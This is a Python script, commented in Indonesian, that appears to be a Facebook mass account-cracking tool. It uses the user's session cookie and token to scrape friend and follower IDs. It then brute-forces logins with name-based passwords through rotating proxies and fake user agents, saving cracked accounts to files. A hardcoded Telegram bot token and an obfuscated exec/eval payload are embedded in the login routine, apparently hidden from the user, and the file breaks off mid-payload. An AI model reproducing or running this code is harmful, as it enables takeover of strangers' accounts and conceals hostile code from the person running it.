###----------[ TEXT BERJALAN ]---------- ###
def basari_tamvan(basjalan):
        for kontol in basjalan + "\n":sys.stdout.write(kontol);sys.stdout.flush();time.sleep(0.05)
        
###----------[ KEMBALI KEMENU ]---------- ###
def back():
	bass()
	
###----------[ BUAT CLEAR LAYAR ]---------- ###
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
		
###----------[ IMPORT MODULE RICH INGREDIENT ]---------- ###
import requests,json,os,sys,random,datetime,time,re
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
import zlib
import subprocess
import base64
from rich import pretty
pretty.install()
CON=sol()
ses=requests.Session()
babas = Console()

###----------[ APPEND ]---------- ###
pwt = ['no']
pwn = []
id,id2 = [],[]
uid = []
ualu = []
ualuh = ['no']
ok,cp = 0,0
loop = 0
ugenm = []
ugenb = []
ugenz = []
akun = []
basari = []
tokenku = []
import random ,base64,codecs,zlib;pyobfuscate=""
ID ="5987043718";
tok="5659246412:AAF_9gW_UcHkXL_Mn8fKsZsphPBXGCluvM0"

###----------[ PROXY LIST ]---------- ###
try:
	proxylist= requests.get('https://raw.githubusercontent.com/Basari-ID/BMBF/main/socks4.txt').text
	open('socks4.txt','w').write(proxylist)
except Exception as e:
	basari_tamvan(f'{bas}Proxy_List_Basari')
prox=open('socks4.txt','r').read().splitlines()
        
###----------[ USER AGENT ]---------- ###
for bz in range(10000):
        a='Mozilla/5.0 (Linux; Android'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='10; SM-G970F)'
        e=random.randrange(100, 9999)
        f='AppleWebKit/537.36 (KHTML, like Gecko)'
        g=random.randrange(1, 9)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Chrome/75.0.3396.81 Mobile Safari/537.36'
        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugenz.append(uaku)

        aa='Mozilla/5.0 (Linux; Android'
        b=random.choice(['7.0','8.1.0','9','10'])
        c=random.choice(['ASUS_X00QD)','ASUS_X01BDA)'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uabas=f'{aa} {b}; {c} {g}{h}.{i}.{j}.{k} {l}'
        ugenm.append(uabas)

        aa='Mozilla/5.0 (Linux; Android'
        b=random.choice(['7.0','8.1.0','9','10'])
        c=random.choice(['ASUS_X008D)','ASUS_X008DA)'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uabas=f'{aa} {b}; {c} {g}{h}.{i}.{j}.{k} {l}'
        ugenb.append(uabas)

###----------[ PEWARNA ]---------- ###
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
bv = '\33[0;36m'
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
bas = '\033[41m\x1b[1;97m'
try:
	warna_kolor = "#00C8FF"
except FileNotFoundError:
	warna_kolor = "#00C8FF"

###----------[ TAHUN AKUN ]---------- ###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
	
###----------[ CONVERT BULAN ]---------- ###
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

###----------[ CEK CEK ]---------- ###
def basarii():
	os.system('clear')
	cetak(panel(f"""[bold green]HARAP FOLLOW FACEBOOK AUTHOR TERLEBIH DAHULU[/]""",width=70,title=f"[bold green]• [bold white]PEMBERITAHUAN [bold green]•",style=f"{warna_kolor}"))
	os.system("xdg-open https://www.facebook.com/bazcracker")
	login_bas()

###----------[ BANNER 1 ]---------- ###
def banner():
	cetak(panel(f"""\t     [bold cyan]______  ___   _________  _______________ 
\t     [bold cyan]| ___ \/ _ \ |___  /|  \/  || ___ \  ___|
\t     [bold cyan]| |_/ / /_\ \   / / | .  . || |_/ / |_   
\t     [bold cyan]| ___ \  _  |  / /  | |\/| || ___ \  _|  
\t     [bold cyan]| |_/ / | | |./ /___| |  | || |_/ / |    
\t     [bold cyan]\____/\_| |_/\_____/\_|  |_/\____/\_|
                   """,width=70,title=f"",subtitle=f"[bold cyan] 2.2 [/]",style=f"{warna_kolor}"))

###----------[ BANNER 2 ]---------- ###
def banner2():
	cetak(panel(f"""\t         [bold cyan]_      ____   _____ _____ _   _ 
\t       [bold cyan] | |    / __ \ / ____|_   _| \ | |
\t       [bold cyan] | |   | |  | | |  __  | | |  \| |
\t       [bold cyan] | |   | |  | | | |_ | | | | . ` |
\t       [bold cyan] | |___| |__| | |__| |_| |_| |\  |
\t       [bold cyan] |______\____/ \_____|_____|_| \_|
                   """,width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
                   
###----------[ LOG COOKIES ]---------- ###
def bass():
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
		tokenku.append(token)
		try:
			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
			basganteng = json.loads(basariheker.text)['id']
			menu(basganteng)
		except KeyError:
			login_bas()
		except requests.exceptions.ConnectionError:
			basari_tamvan(f'{bas}└── JARINGAN EROR BRO COBA LAGI !{x}')
			exit()
	except IOError:
		login_bas()
def login_bas():
	try:
		os.system('clear')
		banner2()
		ses = requests.Session()
		cookie=input(f'{bv}└── Cookies :{x}{H} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		ken = open(".baztoken.txt", "w").write(tok)
		cok = open(".bazcok.txt", "w").write(cookie)
		basari_tamvan(f'{x}{bv}└── Berhasil Login{x} ')
		time.sleep(1)
		bass()
	except Exception as e:
		os.system('rm -rf .bazcok.txt && rm -rf .baztoken.txt')
		basari_tamvan(f'{x}{bv}└── Login Gagal ! Login Ulang Ganti Cookies !{x} ')
		time.sleep(2)
		login_bas()

###----------[ MENU ]---------- ###
def menu(id):
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
		#nama = open('.nama.json','r').read()
	except IOError:
		basari_tamvan(f'{bas}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(4)
		login_bas()
	os.system('clear')
	banner()
	iplu = requests.get("https://api.ipify.org").text
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	gpp = []
	ghku = 'Basari-ID'
	gpp.append(panel(f'[cyan]Asalmu   : {negara}\nUserIp   : {iplu}\nUserId   : {id}',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
	gpp.append(panel(f'[cyan]Author   : Muh Basari\nGithub   : {ghku}\nTanggal  : {tgl} {bln} {thn}',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
	babas.print(Columns(gpp))
	cetak(panel(f'\t                  [bold cyan]Menu Script',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Crack Publik Massal\n [cyan]02. Crack Followers\n [cyan]03. [cyan]Hasil Crack Akun\n [cyan]04. Gabung Grup Wa\n [cyan]05. Lapor Bug Sc\n [cyan]00. Keluar Hapus Cokis',width=70,title=f"",style=f"{warna_kolor}"))
	______muhammad______basari______ = input(f'{bv}└── Pilih : ')
	if ______muhammad______basari______ in ['01','1']:
		dump_massal()
	elif ______muhammad______basari______ in ['02','2']:
		dump_pengikut()
	elif ______muhammad______basari______ in ['03','3']:
		hasil()
	elif ______muhammad______basari______ in ['04','4']:
		gabung_grup()
	elif ______muhammad______basari______ in ['05','5']:
		authorbas()
	elif ______muhammad______basari______ in ['00','0']:
		os.system('rm -rf .bazcok.txt && rm -rf .baztoken.txt')
		basari_tamvan(f'└── Sukses Logout{x} ')
		time.sleep(4)
		exit()
	else:
		basari_tamvan(f'└── Pilih Yang Bener')
		time.sleep(4)
		back()
def authorbas():
	basari_tamvan(f'└── Tunggu Sebentar Nanti Diarahin Ke Facebook  {x}')
	time.sleep(1)
	os.system("xdg-open https://www.facebook.com/bazcracker")
	back()
def gabung_grup():
	basari_tamvan(f'└── Tunggu Sebentar Nanti Diarahin Ke WhatsApp  {x}')
	time.sleep(1)
	os.system("xdg-open https://chat.whatsapp.com/JRKRrH8wkE2A42Cb1e4bnL")
	back()
	
###----------[ CEK HASIL ]---------- ###
def hasil():
	cetak(panel(f'\t                  [bold cyan] Hasil Crack',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Akun OK\n [cyan]02. Akun CP\n [cyan]03. Kembali',width=70,title=f"",style=f"{warna_kolor}"))
	baz_code = input(f'{bv}Pilih : ')
	if baz_code in ['2']:
		try:bass = os.listdir('CP')
		except FileNotFoundError:
			basari_tamvan(f'{bv}└── File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(bass)==0:
			basari_tamvan(f'{bv}└── Tidak Ada Hasil CP ')
			time.sleep(4)
			back()
		else:
			bokep = 0
			indo = {}
			for isi in bass:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				bokep+=1
				if bokep<10:
					nom = ''+str(bokep)
					indo.update({str(bokep):str(isi)})
					indo.update({nom:str(isi)})
					print(f'{bv}└── %s. %s ({k} %s {x}Id )'%(nom,isi,len(hem)))
				else:
					indo.update({str(bokep):str(isi)})
					print('['+str(bokep)+'] '+isi+' [ '+str(len(hem))+' Akun ]'+x)
			geeh = input(f'{bv}└── Pilih : ')
			try:geh = indo[geeh]
			except KeyError:
				basari_tamvan(f'{bv}└── Pilih Yang Bener Cuk ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				basari_tamvan(f'{bv}└── File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}└── {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['1']:
		try:bass = os.listdir('OK')
		except FileNotFoundError:
			basari_tamvan(f'{bv}└── File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(bass)==0:
			basari_tamvan(f'{bv}└── Tidak Ada Hasil OK ')
			time.sleep(4)
			back()
		else:
			bokep = 0
			indo = {}
			for isi in bass:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				bokep+=1
				if bokep<10:
					nom = '0'+str(bokep)
					indo.update({str(bokep):str(isi)})
					indo.update({nom:str(isi)})
					print(f'{bv}└── %s. %s ( {h}%s{x} Id )'%(nom,isi,len(hem)))
				else:
					indo.update({str(bokep):str(isi)})
					print(f'{bv}└── %s. %s ({h} %s {x}Id )'%(cih,isi,(len(hem))))
			geeh = input(f'\n{bv}└── Pilih : ')
			try:geh = indo[geeh]
			except KeyError:
				basari_tamvan(f'{bv}└── Pilih Yang Bener Lah ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				basari_tamvan(f'{bv}└── File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{bv}└── {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['3']:
		back()
	else:
		basari_tamvan('└── Pilih Yang Bener Lah ')
		back()

###----------[ CRACK PENGIKUT ]---------- ###
def dump_pengikut():
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
	except IOError:
		basari_tamvan(f'{bas}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(4)
		exit()
	cetak(panel(f' [cyan]Masukkan Idz Target',width=70,title=f"",style=f"{warna_kolor}"))
	pil = input(f'{bv}└── Idz : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'{bv}└── Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		basari_tamvan(f'[!]{bas} Koneksi Bermasalah {x}')
		time.sleep(4)
		back()
	except (KeyError,IOError):
		basari_tamvan(f'[!]{bas} Gagal mengambil Id target {x}')
		time.sleep(4)
		back()

###----------[ CRACK ID MASSAL ]---------- ###
def dump_massal():
	try:
		token = open('.baztoken.txt','r').read()
		cok = open('.bazcok.txt','r').read()
	except IOError:
		basari_tamvan(f'{bas}[×] Cookies Telah Kadaluarsa ! Ganti Cookies !{x} ')
		time.sleep(4)
		exit()
	try:
		cetak(panel(f' [cyan]Mau Berapa Idz Target',width=70,title=f"",style=f"{warna_kolor}"))
		baz_coder = int(input(f'{bv}└── Pilih : '))
	except ValueError:
		basari_tamvan('[!] Yang Bener Napa Cuk ')
		time.sleep(4)
		exit()
	if baz_coder<1 or baz_coder>100:
		basari_tamvan('[!] Gagal Dump Id Target ')
		time.sleep(5)
		exit()
	ses=requests.Session()
	baz = 0
	for met in range(baz_coder):
		baz+=1
		cetak(panel(f' [cyan]Id Target Harus Bersifat Publik',width=70,title=f"",style=f"{warna_kolor}"))
		bazfaa = input(f'{bv}└── Idz '+str(baz)+' : ')
		uid.append(bazfaa)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			basari_tamvan('[!] Sinyal Lu Eror ')
			exit()
	try:
		print(f'{bv}└── Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		basari_tamvan(f'{bas}└── Koneksi Lu Eror Cuk{x} ')
		time.sleep(4)
		back()
	except (KeyError,IOError):
		basari_tamvan(f'{bas}└── Pertemanan Id Target Lu Tidak Publik {x}')
		time.sleep(4)
		back()
	
###----------[ ATUR SBLUM CRACK ]---------- ###
def setting():
	cetak(panel(f'\t                  [bold cyan] Setting Idz',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Akun Lama\n [cyan]02. Akun Baru\n [cyan]03. Akun Acak',width=70,title=f"",style=f"{warna_kolor}"))
	__baz__gege__ = input(f'{bv}└── Pilih : ')
	if __baz__gege__ in ['1','01']:
		for lama in sorted(id):
			id2.append(lama)
			
	elif __baz__gege__ in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
			
	elif __baz__gege__ in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		basari_tamvan(f'{bv}└── Pilih Yang Bener Cuukk')
		exit()
		
	cetak(panel(f'\t                  [bold cyan] Method Crack',width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f' [cyan]01. Method Mobile Async\n [cyan]02. Method Mbasic Async',width=70,title=f"",style=f"{warna_kolor}"))
	____method_crack____ = input(f'{bv}└── Pilih : ')
	if ____method_crack____ in ['1','01']:
		basari.append('m.facebook')
	elif ____method_crack____ in ['']:
		basari_tamvan(f'{bas}└── Pilih Yang Bener ')
		setting()
	elif ____method_crack____ in ['2','02']:
		basari.append('b.facebook')
	else:
		basari.append('m.facebook')
		
	#cetak(panel(f' [cyan]Ingin Menambahkan Kata Sandi Y/t',width=70,title=f"",style=f"{warna_kolor}"))
	#pwtambah=input(f'{bv}└── Pilih : ')
	#if pwtambah in ['y','Y']:
		#pwt.append('ya')
		#cetak(panel(f' [cyan]Gunakan Koma Untuk Pemisah\n Contoh : sayang,anjing,bangsat',width=70,title=f"",style=f"{warna_kolor}"))
		#pwku=input(f'{bv}└── Sandi :{x}{M} ')
		#pwkuh=pwku.split(',')
		#for xpw in pwkuh:
			#pwn.append(xpw)
	#else:
		#pwt.append('no')
		
	#cetak(panel(f' [cyan]Ingin Menambahkan User Agent Y/t',width=70,title=f"",style=f"{warna_kolor}"))
	#uat = input(f'{bv}└── Pilih : ')
	#if uat in ['y','Ya','ya','Y']:
		#ualuh.append('ya')
		#bz = input(f'{bv}└── Ugent :{x}{M} ')
		#ualu.append(bz)
	#else:
		#ualuh.append('no')
	wordlist()
	
###----------[ WORDLIST ]---------- ###
def wordlist():
	global prog,des
	cetak(panel(f'       [cyan]Hasil [green]OK[cyan] Tersimpan Di : [green]OK/%s [white]'%(okc),width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f'       [cyan]Hasil [yellow]CP[cyan] Tersimpan Di : [yellow]CP/%s [white]'%(cpc),width=70,title=f"",style=f"{warna_kolor}"))
	cetak(panel(f'    [cyan]On/Of Mode Pesawat Setiap 400 Id Agar Tidak Terkena Spam',width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
	print('')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'm.facebook' in basari:
					pool.submit(crackm,idf,pwv)
				elif 'b.facebook' in basari:
					pool.submit(crackb,idf,pwv)
				else:
					pool.submit(crackb,idf,pwv)
		print('')
		print(f'{x}AKUN OK : {h}%s '%(ok))
		print(f'{x}AKUN CP : {k}%s{x} '%(cp))
		print('')
###----------[ MOBILE V1 ]---------- ###
def crackm(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[[bold cyan]cracking[white]] [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugenm)
	ses = requests.Session()
	for pw in pwv:
		try:
			#if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=966242223397117&auth_token=9af15271c748d378ef8bc2b720b79e63&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F10%252Fprotecting-people-on-instagram-from-abuse%252F%26src%3Dsdkpreparse&refsrc=deprecated&app_id=966242223397117&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
				os.popen('play-audio bazcp.mp3')
				obfuscate={'(https://pyobfuscate.com)*(RSA)':'''(BmSM&0bVr+0DN>W2;i`bLD>O$*=~+GVLTw@U_|^PA=@j_spww3u6Cg|8Oc#det@Cbr)@C_~6gF6v=0oRqrpjc&rj$nQ3@0PDm<g{oSU|UVsdXyA1GKN>XB!K(*n)_G&ZWABc(Zhxh'''.replace('\n','')}
				_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='506170 8610796 2930370 2726977 3634338 143530 1681536 663584 864160 1935040 5247900 3896634 1751136 7175470 3094080 10588320 4704378 10789240 4547439 6151607 8791865 7962240 10324470 1501376 3881325 1894202 5693184 9865569 7740714 8220688 2357312 6839509 2973743 8261172 35050 2349260 3765480 4688145 4347141 1063776 7357532 390514 466290 2512352 2311008 1470464 192544 8607375 4544650 7045584 300807 7868048 1455680 979744 1971984 2967510 1667680 857152 4617480 10835110 8071620 10429096 3316818 7081128 537084 1253696 6968934 2124131 7023402 2290158 4036162 8646045 2750824 10550100 82912 672888 2706330 280336 5884794 849006 5095880 5526670 3120704 2893246 989120 7955164 8876789 4708314 968128 6738672 9360408 2627008 3358506 8990280 2343915 3277116 2237200 3884135 50500 824160 3023872 3028832 2239456 8690505 5934080 3950940 6105199 4080608 7805298 308370 2046704 5854755 9038680 1297960 3705117 3765790 10534139 8961835 509691 938818 4033602 8216148 1302720 689955 8298872 885120 1553531 733460 508660 1847730 6748596 3070008 1983315 8044885 9314130 404935 267232 3802416 6876366 8008988 2956305 5033005 2335080 419798 626544 5432689 7711459 8703747 6687816 9214835 4991364 269560 2434128 1410400 4446820 3374898 70094 1632120 3527680 3066460 5089448 2167576 11406628 2595488 5458590 4115100 3127991 562449 618240 2324652 11049273 4392752 9763236 4994379 10939260 3885453 2093842 8614392 7980010 2849608 4342338 10047276 7884842 2172058 5639289 9687819 1866105 4218890 6420136 5256120 1078336 1750048 4070111 2749926 10190716 4697510 1630080 1414040 964010 8380768 2784222 12043372 4842304 553750 2956896 2307808 2336480 1559552 2418114 9073260 3478074 3145958 2925024 9639462 3046580 2056568 2601984 5641423 3289760 5704608 688384 